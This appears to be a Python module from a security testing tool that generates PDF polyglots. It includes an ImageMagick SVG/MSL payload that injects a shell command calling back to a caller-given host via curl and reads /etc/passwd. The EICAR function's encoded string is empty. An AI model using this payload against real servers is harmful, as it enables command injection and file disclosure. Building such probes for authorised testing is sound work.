"""PDF polyglot generators."""

from __future__ import annotations

import base64
import bz2
import os
import re
import zlib

from lib.pdf.obfuscation import ensure_scheme

def write_eicar_polyglot(filename):
    eicar = ''
    with open(filename, "wb") as file:
        file.write(bz2.decompress(base64.b64decode(eicar)))


def write_imagemagick_svg_polyglot(filename, host):
    basename = os.path.basename(str(filename))
    with open(filename, "w") as file:
        file.write('''<image authenticate='ff" `curl ''' + host + '''/test14`;"'>
  <read filename="pdf:/etc/passwd"/>
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="msl:''' + basename + '''" height="100" width="100"/>
  </svg>
</image>
''')
